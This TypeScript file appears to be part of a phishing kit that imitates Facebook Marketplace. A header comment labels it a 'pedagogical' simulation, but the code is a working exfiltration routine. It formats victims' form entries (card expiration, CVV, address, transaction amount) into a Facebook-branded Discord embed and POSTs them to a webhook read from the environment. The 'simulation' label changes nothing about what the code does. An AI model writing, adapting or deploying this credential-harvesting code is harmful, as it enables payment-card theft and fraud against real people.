
/**
 * PEDAGOGICAL NOTE:
 * This utility simulates the 'data exfiltration' phase of a phishing attack.
 * In a real-world scenario, attackers use webhooks or C2 servers to collect
 * stolen credentials and PII in real-time.
 */

const getIconForTitle = (title: string): string => {
  if (title.toLowerCase().includes('montant initial')) return '💰';
  if (title.toLowerCase().includes('livraison')) return '🚚';
  if (title.toLowerCase().includes('bancaires')) return '💳';
  return '📦'; // Default icon
};

export const sendToDiscord = async (title: string, data: Record<string, string>) => {
  const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
  if (!WEBHOOK_URL) {
    console.error('DISCORD_WEBHOOK_URL is not defined in environment variables.');
    return;
  }

  const INLINE_KEYS = ['Ville', 'Code Postal', 'Expiration', 'CVV'];

  // Extract amount and remove it from the main data object to avoid duplication
  const amount = data['Montant'] || 'Non spécifié';
  const filteredData = { ...data };
  delete filteredData['Montant'];

  const embedFields = Object.entries(filteredData).map(([key, value]) => ({
    name: `**${key}**`,
    value: `${value && value.trim() !== '' ? value : 'Non renseigné'}`,
    inline: INLINE_KEYS.includes(key),
  }));

  const payload = {
    username: "Marketplace Logs",
    avatar_url: "https://upload.wikimedia.org/wikipedia/commons/b/b9/2023_Facebook_icon.svg",
    embeds: [
      {
        title: `${getIconForTitle(title)}  ${title}`,
        description: `**Montant de la Transaction**\n**${amount}**`,
        color: 0x0866FF, // Facebook Blue
        fields: embedFields,
        timestamp: new Date().toISOString(),
        footer: {
          text: "Surveillance Simulation Marketplace",
          icon_url: "https://upload.wikimedia.org/wikipedia/commons/b/b9/2023_Facebook_icon.svg"
        },
      },
    ],
  };

  // Log to console for debugging/pedagogical purposes.
  console.group(`[SIMULATION] Données Exfiltrées: ${title}`);
  console.table(data);
  console.log("----- PAYLOAD ENVOYÉ AU WEBHOOK -----");
  console.log(JSON.stringify(payload, null, 2));
  console.groupEnd();
  
  try {
    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
        console.error(`Webhook failed with status: ${response.status}`);
        const responseBody = await response.text();
        console.error('Response body from Discord:', responseBody);
    }
  } catch (error) {
    console.error('Webhook fetch error:', error);
  }
};
